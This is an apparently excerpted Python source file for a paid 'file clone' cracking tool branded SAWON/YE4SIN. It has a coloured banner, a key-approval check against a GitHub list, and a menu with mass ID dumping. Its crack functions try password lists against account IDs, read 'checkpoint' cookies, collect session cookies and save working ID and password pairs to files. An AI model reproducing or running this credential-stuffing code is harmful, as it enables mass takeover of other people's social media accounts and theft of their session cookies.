...
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#os.system('xdg-open https://www.facebook.com/YE4SIN.khan444?mibextid=b06tZ0')
logo =(f"""
\x1b[1;97m _____  ___  _    _  _____ _   _      ___  ___________  ___
\033[1;32m/  ___|/ _ \| |  | ||  _  | \ | |  _  |  \/  |_   _|  \/  |
\033[1;36m\ `--./ /_\ \ |  | || | | |  \| |_| |_| .  . | | | | .  . |
\033[1;34m `--. \  _  | |/\| || | | | . ` |_   _| |\/| | | | | |\/| |
\x1b[1;91m/\__/ / | | \  /\  /\ \_/ / |\  | |_| | |  | |_| |_| |  | |
\x1b[1;94m\____/\_| |_/\/  \/  \___/\_| \_/     \_|  |_/\___/\_|  |_/
                                                                                                                                                                                                                                                                                                                                                                                                                    
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m SAWON\033[1;91m-\033[1;92mISLAM💝🤘\033[1;91m-\033[1;92m\033[1;91m-\033[1;92m                  \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m BD-FILE CLONE                \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL\033[1;91m         \033[1;91m: \033[1;92m\033[1;91m-\033[1;92mPAID                         \033[1;91m|
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/RAIYAN-420/Apporval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801742172143?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python YE4SIN.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  SAWON,  V I P,  Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'SAWON' and password == 'MIM':
...
def menu():
    ...
    print('\x1b[38;5;50║══=================')
    YE4SIN = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if YE4SIN in ['111']:
        login()
        dump_massal()
    elif YE4SIN in ['1']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/YE4SIN.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python YE4SIN-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[SAWON+MIM-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mSAWON+MIM-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mSAWON+MIM-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " SAWON+MIM,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[SAWON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•YE4SIN-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " SAWON,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
